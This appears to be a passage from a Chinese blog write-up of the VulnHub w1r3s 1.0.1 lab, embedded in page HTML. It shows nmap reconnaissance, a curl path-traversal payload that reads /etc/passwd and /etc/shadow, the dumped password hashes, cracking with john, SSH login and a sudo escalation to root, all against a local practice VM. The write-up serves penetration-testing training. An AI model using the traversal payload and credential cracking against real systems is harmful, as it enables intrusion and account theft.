daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false 关于这个payload，就是使用curl方法读取alertConfigField.php，参数为urlConfig=../../../../../../../../../etc/passwd，请求需要使用url编码，但是这一步仍有疑惑。\n同样在这一步存在密码hash的地方都是用x代替的，再去读取shadow中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 ┌──(kali㉿kali)-[~/桌面] └─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.152.132/administrator/alerts/alertConfigField.php Configuration: root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7::: daemon:*:17379:0:99999:7::: bin:*:17379:0:99999:7::: sys:*:17379:0:99999:7::: sync:*:17379:0:99999:7::: games:*:17379:0:99999:7::: man:*:17379:0:99999:7::: lp:*:17379:0:99999:7::: mail:*:17379:0:99999:7::: news:*:17379:0:99999:7::: uucp:*:17379:0:99999:7::: proxy:*:17379:0:99999:7::: www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7::: backup:*:17379:0:99999:7::: list:*:17379:0:99999:7::: irc:*:17379:0:99999:7::: gnats:*:17379:0:99999:7::: nobody:*:17379:0:99999:7::: systemd-timesync:*:17379:0:99999:7::: systemd-network:*:17379:0:99999:7::: systemd-resolve:*:17379:0:99999:7::: systemd-bus-proxy:*:17379:0:99999:7::: syslog:*:17379:0:99999:7::: _apt:*:17379:0:99999:7::: messagebus:*:17379:0:99999:7::: uuidd:*:17379:0:99999:7::: lightdm:*:17379:0:99999:7::: whoopsie:*:17379:0:99999:7::: avahi-autoipd:*:17379:0:99999:7::: avahi:*:17379:0:99999:7::: dnsmasq:*:17379:0:99999:7::: colord:*:17379:0:99999:7::: speech-dispatcher:!:17379:0:99999:7::: hplip:*:17379:0:99999:7::: kernoops:*:17379:0:99999:7::: pulse:*:17379:0:99999:7::: rtkit:*:17379:0:99999:7::: saned:*:17379:0:99999:7::: usbmux:*:17379:0:99999:7::: w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7::: sshd:*:17554:0:99999:7::: ftp:*:17554:0:99999:7::: mysql:!:17554:0:99999:7::: 密码破解 1 2 3 root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7::: www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7::: w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7::: 可能是密码简单，破解起来也很顺利，但是没有root用户的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/桌面] └─$ john hash Warning: detected hash type \"sha512crypt\", but the string is also recognized as \"HMAC-SHA256\" Use the \"--format=HMAC-SHA256\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status www-data (www-data) Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst computer (w1r3s) 但是也算找到了立足点，先登录一下w1r3s\n成功登录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ┌──(kali㉿kali)-[~/桌面] └─$ ssh w1r3s@192.168.152.132 The authenticity of host '192.168.152.132 (192.168.152.132)' can't be established. ED25519 key fingerprint is SHA256:Bue5VbUKeMSJMQdicmcMPTCv6xvD7I+20Ki8Um8gcWM. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '192.168.152.132' (ED25519) to the list of known hosts. ---------------------- Think this is the way? ---------------------- Well,........possibly. ---------------------- w1r3s@192.168.152.132's password: Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 108 packages can be updated. 6 updates are security updates. .....You made it huh?.... Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35 w1r3s@W1R3S:~$ 提权 已经给出了明显的提示，作为一个靶场，很确定的就是通过该账户去进行提权操作，当然有兴趣也可以去看看wordpress是否还有什么内容\n1 2 3 4 5 ---------------------- Think this is the way? ---------------------- Well,........possibly. ---------------------- 进行一个枚举操作\n1 2 3 4 5 6 w1r3s@W1R3S:~$ whoami w1r3s w1r3s@W1R3S:~$ ls Desktop Documents Downloads examples.desktop ftp Music Pictures Public Templates Videos w1r3s@W1R3S:~$ id uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) 有sudo的权限想提权就简单了\n1 2 3 4 5 6 7 8 w1r3s@W1R3S:~$ sudo -l [sudo] password for w1r3s: Matching Defaults entries for w1r3s on W1R3S.localdomain: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User w1r3s may run the following commands on W1R3S.localdomain: (ALL : ALL) ALL 显示有all，直接sudo su\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 w1r3s@W1R3S:~$ sudo su root@W1R3S:/# whoami root root@W1R3S:/# whoami root root@W1R3S:/# id uid=0(root) gid=0(root) groups=0(root) root@W1R3S:/# uname -a Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux root@W1R3S:/# ip a 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:0c:29:60:2f:0a brd ff:ff:ff:ff:ff:ff inet 192.168.152.132/24 brd 192.168.152.255 scope global dynamic ens33 valid_lft 1548sec preferred_lft 1548sec inet6 fe80::4564:7ee7:b335:26ec/64 scope link valid_lft forever preferred_lft forever 提权成功\n拿到flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 root@W1R3S:/# cd root root@W1R3S:~# ls flag.txt root@W1R3S:~# cat flag.txt ----------------------------------------------------------------------------------------- ____ ___ _ _ ____ ____ _ _____ _ _ _ _ _____ ___ ___ _ _ ____ / ___/ _ \\| \\ | |/ ___| _ \\ / \\|_ _| | | | | / \\|_ _|_ _/ _ \\| \\ | / ___| | | | | | | \\| | | _| |_) | / _ \\ | | | | | | | / _ \\ | | | | | | | \\| \\___ \\ | |__| |_| | |\\ | |_| | _ \u003c / ___ \\| | | |_| | |___ / ___ \\| | | | |_| | |\\ |___) | \\____\\___/|_| \\_|\\____|_| \\_\\/_/ \\_\\_| \\___/|_____/_/ \\_\\_| |___\\___/|_| \\_|____/ ----------------------------------------------------------------------------------------- .-----------------TTTT_-----_______ /''''''''''(______O] ----------____ \\______/]_ __...---'\"\"\"\\_ --'' Q ___________@ |''' ._ _______________=---------\"\"\"\"\"\"\" | ..--''| l L |_l | | ..--'' . /-___j ' ' | ..--'' / , ' ' |--'' / ` \\ L__' \\ - - '-. '. / '-./ ---------------------------------------------------------------------------------------- YOU HAVE COMPLETED THE __ __ ______________________ _________ / \\ / \\/_ \\______ \\_____ \\ / _____/ \\ \\/\\/ / | || _/ _(__ \u003c \\_____ \\ \\ / | || | \\/ \\/ \\ \\__/\\ / |___||____|_ /______ /_______ /.INC \\/ \\/ \\/ \\/ CHALLENGE, V 1.0 ---------------------------------------------------------------------------------------- CREATED BY SpecterWires ---------------------------------------------------------------------------------------- 补充 还有一种简便但不推荐的方式，直接使用hashcat或者hydra进行ssh的爆破，最终也是能拿到相同的密码的\n",
+  "wordCount" : "6159",
+  "inLanguage": "en",
+  "datePublished": "2025-03-03T14:41:56+08:00",
+  "dateModified": "2025-05-07T21:33:23+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Wh1teJ0ker"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/post/vulnhubw1r3s101-zep7pg.html"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Wh1teJ0kerのBlog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/favicon.ico">
+
+<link rel="manifest" href="/favicon.ico">
+
+    <link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/style.css" />
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.css" media="screen">
+    
+
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.65a3017a8aabe1f9330e70527075c8d51bc9634d5cac35077af03588c1df8078.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            HOME
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/friends/">友链</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/about/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://cloud.umami.is/share/5RZUCwaG2fOysYPa/wh1tej0ker.github.io">Dashboard</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/Wh1teJ0ker"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-search">
+                <a href="javascript:void(0)" id="search-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                </a>
+            </li>
+
+            
+        </ul>
+        
+    </section>
+</nav>
+
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>VulnHub-w1r3s-1.0.1</h1>
+  </header>
+
+  <p>
+  <small>
+    March 3, 2025&nbsp;· &nbsp;· </small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <details open class="toc-details">
+    <summary class="toc-summary">目录</summary>
+    <div class="toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息搜集">信息搜集</a>
+      <ul>
+        <li><a href="#查找主机">查找主机</a></li>
+        <li><a href="#端口扫描">端口扫描</a></li>
+        <li><a href="#详细信息扫描">详细信息扫描</a>
+          <ul>
+            <li><a href="#tcp扫描">TCP扫描</a></li>
+            <li><a href="#udp扫描">UDP扫描</a></li>
+            <li><a href="#vuln脚本扫描">vuln脚本扫描</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#ftp渗透">FTP渗透</a>
+      <ul>
+        <li><a href="#匿名登录">匿名登录</a></li>
+        <li><a href="#信息泄露">信息泄露</a>
+          <ul>
+            <li><a href="#content">content</a></li>
+            <li><a href="#docs">docs</a></li>
+            <li><a href="#new-employees">new-employees</a></li>
+          </ul>
+        </li>
+        <li><a href="#整理破解">整理破解</a></li>
+      </ul>
+    </li>
+    <li><a href="#mysql">MySQL</a></li>
+    <li><a href="#web渗透">Web渗透</a>
+      <ul>
+        <li><a href="#administrator">administrator</a>
+          <ul>
+            <li><a href="#漏洞利用">漏洞利用</a></li>
+            <li><a href="#密码破解">密码破解</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#提权">提权</a></li>
+    <li><a href="#补充">补充</a></li>
+  </ul>
+</nav>
+    </div>
+</details>
+  </div>
+
+  <section class="blog-content"><h1 id="vulnhub-w1r3s-101">VulnHub-w1r3s-1.0.1</h1>
+<p>载入虚拟机后是一个未知账户，需要密码，流程开始</p>
+<h2 id="信息搜集">信息搜集</h2>
+<h3 id="查找主机">查找主机</h3>
+<p>先查看自身主机，发现本地的ip为192.168.152.131，所在网段应该就是192.168.200.0/24</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ ip a  
+</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="cl">    inet6 ::1/128 scope host noprefixroute 
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="cl">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+</span></span><span class="line"><span class="cl">    link/ether 00:0c:29:82:4e:1f brd ff:ff:ff:ff:ff:ff
+</span></span><span class="line"><span class="cl">    inet 192.168.152.131/24 brd 192.168.152.255 scope global dynamic noprefixroute eth0
+</span></span><span class="line"><span class="cl">       valid_lft 1414sec preferred_lft 1414sec
+</span></span><span class="line"><span class="cl">    inet6 fe80::3021:1752:2678:7550/64 scope link noprefixroute 
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因此开始扫描该网段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sn 192.168.152.0/24         
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 22:32 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.1
+</span></span><span class="line"><span class="cl">Host is up (0.00020s latency).
+</span></span><span class="line"><span class="cl">MAC Address: 00:50:56:C0:00:08 (VMware)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.2
+</span></span><span class="line"><span class="cl">Host is up (0.00016s latency).
+</span></span><span class="line"><span class="cl">MAC Address: 00:50:56:FB:F0:8A (VMware)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.132
+</span></span><span class="line"><span class="cl">Host is up (0.00022s latency).
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:60:2F:0A (VMware)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.254
+</span></span><span class="line"><span class="cl">Host is up (0.00032s latency).
+</span></span><span class="line"><span class="cl">MAC Address: 00:50:56:E9:C0:09 (VMware)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.131
+</span></span><span class="line"><span class="cl">Host is up.
+</span></span><span class="line"><span class="cl">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.92 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>注意点</strong></p>
+<p>-sn参数是仅ping，而不进行端口扫描，-sP参数已废弃</p>
+<p>使用arp-scan命令也能达到同样的效果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$  sudo arp-scan -l   
+</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 00:0c:29:82:4e:1f, IPv4: 192.168.152.131
+</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+</span></span><span class="line"><span class="cl">192.168.152.1   00:50:56:c0:00:08       VMware, Inc.
+</span></span><span class="line"><span class="cl">192.168.152.2   00:50:56:fb:f0:8a       VMware, Inc.
+</span></span><span class="line"><span class="cl">192.168.152.132 00:0c:29:60:2f:0a       VMware, Inc.
+</span></span><span class="line"><span class="cl">192.168.152.254 00:50:56:e9:c0:09       VMware, Inc.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4 packets received by filter, 0 packets dropped by kernel
+</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: 256 hosts scanned in 2.004 seconds (127.74 hosts/sec). 4 responded
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>注意</strong></p>
+<p>可以利用靶机上下线，确定自己的靶机IP</p>
+<h3 id="端口扫描">端口扫描</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap --min-rate 10000 -p- 192.168.152.132   
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 22:55 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.132
+</span></span><span class="line"><span class="cl">Host is up (0.00018s latency).
+</span></span><span class="line"><span class="cl">Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:60:2F:0A (VMware)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>注意</strong></p>
+<p>-p是指定端口参数，而-p-是指全端口扫描，防止存在信息遗漏</p>
+<p>又学到一手，细节太多了，tql</p>
+<p><strong>小技巧</strong></p>
+<p>如果扫描过程中存在大量端口，可以的处理方法</p>
+<p>首先在上述扫描的时候可以先将扫描参数保存</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo nmap --min-rate 10000 -p- 192.168.152.132  -oA [路径]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提取分割</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">grep open [路径] | awk -F &#39;/&#39; &#39;{print $1}&#39; | paste -sd &#39;,&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>指定变量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ports=grep open [路径] | awk -F &#39;/&#39; &#39;{print $1}&#39; | paste -sd &#39;,&#39;
+</span></span><span class="line"><span class="cl">echo $ports
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="详细信息扫描">详细信息扫描</h3>
+<h4 id="tcp扫描">TCP扫描</h4>
+<ul>
+<li>-sT：指定TCP协议</li>
+<li>-sV：探测各服务的版本</li>
+<li>-sC：使用默认脚本</li>
+<li>-O：探测各操作系统的版本</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.152.132
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 23:10 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.132
+</span></span><span class="line"><span class="cl">Host is up (0.00048s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp     vsftpd 2.0.8 or later
+</span></span><span class="line"><span class="cl">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
+</span></span><span class="line"><span class="cl">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
+</span></span><span class="line"><span class="cl">|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
+</span></span><span class="line"><span class="cl">| ftp-syst: 
+</span></span><span class="line"><span class="cl">|   STAT: 
+</span></span><span class="line"><span class="cl">| FTP server status:
+</span></span><span class="line"><span class="cl">|      Connected to ::ffff:192.168.152.131
+</span></span><span class="line"><span class="cl">|      Logged in as ftp
+</span></span><span class="line"><span class="cl">|      TYPE: ASCII
+</span></span><span class="line"><span class="cl">|      No session bandwidth limit
+</span></span><span class="line"><span class="cl">|      Session timeout in seconds is 300
+</span></span><span class="line"><span class="cl">|      Control connection is plain text
+</span></span><span class="line"><span class="cl">|      Data connections will be plain text
+</span></span><span class="line"><span class="cl">|      At session startup, client count was 2
+</span></span><span class="line"><span class="cl">|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class="line"><span class="cl">|_End of status
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
+</span></span><span class="line"><span class="cl">|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.18 (Ubuntu)
